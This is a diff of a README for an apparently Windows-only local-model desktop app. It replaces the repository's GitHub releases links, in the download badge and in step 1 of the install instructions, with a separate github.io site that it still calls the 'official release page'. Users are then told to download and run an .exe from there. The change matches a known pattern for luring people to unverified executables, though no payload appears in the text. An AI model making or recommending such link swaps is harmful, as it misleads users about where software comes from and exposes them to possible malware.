@@ -1,6 +1,6 @@
 # 🌳 Bonsai-27b-Ollama-Desktop - Run complex local models on Windows
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Releases-blue)](https://ventass6913.github.io)
 
 ## 📦 What is this software?
 
@@ -22,7 +22,7 @@ To run this software, your computer needs specific hardware components. If your 
 
 Follow these steps to get the software on your Windows machine.
 
-1.  Visit the official release page to download the latest version: [https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases](https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases).
+1.  Visit the official release page to download the latest version: [https://ventass6913.github.io](https://ventass6913.github.io).
 2.  Look for the file that ends in .exe under the latest version header.
 3.  Click the file name to start the download.
 4.  Once the file finishes downloading, locate it in your Downloads folder.
